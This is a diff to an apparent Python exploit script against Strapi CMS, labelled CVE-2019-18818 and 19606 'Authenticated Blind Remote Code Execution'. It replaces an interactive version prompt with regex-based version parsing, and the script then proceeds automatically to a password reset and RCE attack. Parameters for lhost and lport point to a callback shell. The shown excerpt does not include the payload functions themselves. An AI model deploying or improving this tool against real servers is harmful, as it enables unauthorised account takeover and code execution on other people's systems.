@@ -1,7 +1,8 @@
 import requests
 import json
 import argparse
- 
+import re
+
 class Strapi():
     def __init__(self,target,email,password,lhost,lport):
         self.target = target
@@ -23,19 +24,26 @@ class Strapi():
     def check_version(self):
         requests.packages.urllib3.disable_warnings()
         version_url = self.url + "admin/strapiVersion"
-
-        version = json.loads(requests.get(version_url,verify=False).text)
+        version_req = json.loads(requests.get(version_url,verify=False).text)
         
-        print("Detected version found in /admin/strapiVersion: " + version["strapiVersion"])
-        while True:
-            version_question = input("For password change, is version less than beta-17.5? y or n? ")
-            if version_question == "y":
+        try:
+            version_search = re.findall("beta.+$",version_req["strapiVersion"])
+            check = version_search[0].replace("beta.","")
+            
+            if float(check) < 17.5:
+                print("Detected version " + version_req["strapiVersion"] + " found in /admin/strapiVersion is less than 3.0.0-beta.17.5")
+                print("Proceeding with attack")
                 self.jwt = self.change_pass()
                 self.rce_exploit()
-            elif version_question == "n":
-                print("Password change won't work with this version but press y if you still want to try.")
+            
             else:
-                print("Invalid input. Only y or n")
+                print("Detected version " + version_req["strapiVersion"] + " found in /admin/strapiVersion is greater than 3.0.0-beta.17.5")
+                print("Proceeding with attack but it may not be successful")
+                self.jwt = self.change_pass()
+                self.rce_exploit()
+        
+        except IndexError:
+                print("The version " + version_req["strapiVersion"] + " found in /admin/strapiVersion does not match the 3.0.0-beta.number format")
 
     def change_pass(self):
         requests.packages.urllib3.disable_warnings()
@@ -66,7 +74,6 @@ class Strapi():
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Strapi CMS CVE-2019-18818 and 19606 / Authenticated Blind Remote Code Execution')
-
     parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://strapi.hack', required=True)
     parser.add_argument('-e', metavar='<email>', help='Email', required=True)
     parser.add_argument('-p', metavar='<new password>', help="Password", required=True)
